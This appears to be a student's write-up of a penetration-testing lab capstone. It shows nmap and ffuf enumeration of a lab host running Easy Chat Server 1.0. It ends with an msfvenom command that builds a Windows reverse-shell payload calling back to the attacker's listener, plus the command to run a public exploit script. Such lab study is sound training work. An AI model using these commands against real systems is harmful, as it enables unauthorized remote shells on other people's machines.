IP: 
```
192.168.246.213
```

# Objective
**Capstone Exercise**: Enumerate the Module Exercise VM 3 and find the application that has a memory corruption vulnerability. Then find the related public exploit and fix it as illustrated in this Module.
# nmap
```
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
20000/tcp open  http          Easy Chat Server httpd 1.0
|_http-title: Easy Chat Server
|_http-server-header: Easy Chat Server/1.0
| http-methods: 
|_  Supported Methods: GET
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 11|10 (88%), FreeBSD 6.X (85%)
OS CPE: cpe:/o:freebsd:freebsd:6.2 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Microsoft Windows 11 21H2 (88%), FreeBSD 6.2-RELEASE (85%), Microsoft Windows 10 (85%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.006 days (since Sat Dec 30 12:47:45 2023)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-12-30T01:56:00
|_  start_date: N/A

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   274.59 ms 192.168.45.1
2   274.55 ms 192.168.45.254
3   274.60 ms 192.168.251.1
4   274.65 ms 192.168.246.213
```

# ffuf
```
$ ffuf -u "http://192.168.246.213:20000/FUZZ" -w /usr/share/wordlists/dirb/common.txt -r 

                        [Status: 200, Size: 6822, Words: 653, Lines: 163, Duration: 276ms]
```

# Exploit
Build exploit
```sh
$ msfvenom -p windows/shell_reverse_tcp lhost=192.168.45.216 lport=7777 -f python -b '\x00\x20' -v shellcode
```

Run exploit
```
$ python3 ./50999.py 192.168.45.216 7777
```